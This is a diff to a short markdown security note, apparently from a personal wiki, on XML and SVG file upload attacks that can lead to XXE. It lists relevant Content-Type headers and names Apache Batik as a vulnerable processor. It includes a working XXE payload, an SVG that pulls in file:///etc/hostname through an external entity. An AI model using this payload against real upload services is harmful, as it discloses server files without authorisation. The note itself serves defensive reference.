@@ -3,10 +3,13 @@ tags:
   - web
   - security
 ---
-An attack against file uploads that accept [[Scalable Vector Graphics|SVG]] to parse XML documents. Can lead to XXE depending on the image processor.
-
+An attack against file uploads that accept XML-related file formats.
+- `Content-Type: text/xml`
+- `Content-Type: image/svg+xml`
+# SVG
+[[Scalable Vector Graphics|SVG]] to parse XML documents. Can lead to XXE depending on the image processor.
 ```
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
 ```
-# Vulnerable Processors
+### Vulnerable Processors
 - [[Apache Batik]]
